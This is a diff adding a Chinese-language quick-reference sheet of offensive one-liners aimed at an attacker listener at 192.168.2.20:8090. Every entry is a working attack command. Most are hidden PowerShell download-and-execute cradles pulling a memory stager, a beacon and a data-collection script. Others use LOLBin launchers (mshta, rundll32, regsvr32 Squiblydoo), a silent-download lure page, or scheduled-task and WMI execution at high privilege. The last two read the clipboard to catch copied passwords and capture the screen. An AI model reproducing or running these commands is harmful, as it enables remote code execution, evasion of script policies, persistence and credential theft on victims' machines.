@@ -1,0 +1,37 @@
+===== 轻量触发 / 空窗 单行速查（LHOST=192.168.2.20:8090）=====
+
+[1] 执行证明（弹窗）
+powershell -nop -w hidden -ep bypass -c "iex(iwr http://192.168.2.20:8090/delivery/simple/proof_msgbox.ps1 -UseBasicParsing)"
+
+[2] 出网证明（只发 DNS，无 TCP）
+powershell -nop -w hidden -ep bypass -c "iex(iwr http://192.168.2.20:8090/delivery/simple/beacon_dns.ps1 -UseBasicParsing)"
+
+[3] 一屏情报
+powershell -nop -w hidden -ep bypass -c "iex(iwr http://192.168.2.20:8090/delivery/simple/quick_collect.ps1 -UseBasicParsing)"
+
+[4] 静默落地（内存 stager）
+powershell -nop -w hidden -ep bypass -c "iex(iwr http://192.168.2.20:8090/delivery/stager_mem.ps1 -UseBasicParsing)"
+
+[5] mshta 拉起（LOLBin，绕过脚本策略）
+mshta http://192.168.2.20:8090/delivery/simple/loading.hta
+
+[6] rundll32 + mshtml 拉起
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:http://192.168.2.20:8090/delivery/stager_mem.ps1")
+
+[7] regsvr32 远程脚本（Squiblydoo）
+regsvr32 /s /n /u /i:http://192.168.2.20:8090/delivery/simple/scrobj.sct scrobj.dll
+
+[8] 浏览器空窗诱导（打开即静默触发下载）
+http://192.168.2.20:8090/delivery/simple/blank_loading.html
+
+[9] 计划任务一次性执行（不需交互）
+schtasks /create /tn XDiag /tr "powershell -nop -w hidden -ep bypass -c iex(iwr http://192.168.2.20:8090/delivery/simple/proof_msgbox.ps1 -UseBasicParsing)" /sc once /st 00:00 /rl HIGHEST /f && schtasks /run /tn XDiag
+
+[10] WMI 进程创建（无文件、无计划任务）
+wmic process call create "powershell -nop -w hidden -ep bypass -c iex(iwr http://192.168.2.20:8090/delivery/simple/quick_collect.ps1 -UseBasicParsing)"
+
+[11] 剪贴板读取（看用户是否在复制密码）
+powershell -c "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::GetText()"
+
+[12] 屏幕截图（确认桌面活动）
+powershell -c "Add-Type -AssemblyName System.Drawing,System.Windows.Forms; $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; [System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); $bmp.Save('$env:TEMP\s.png')"
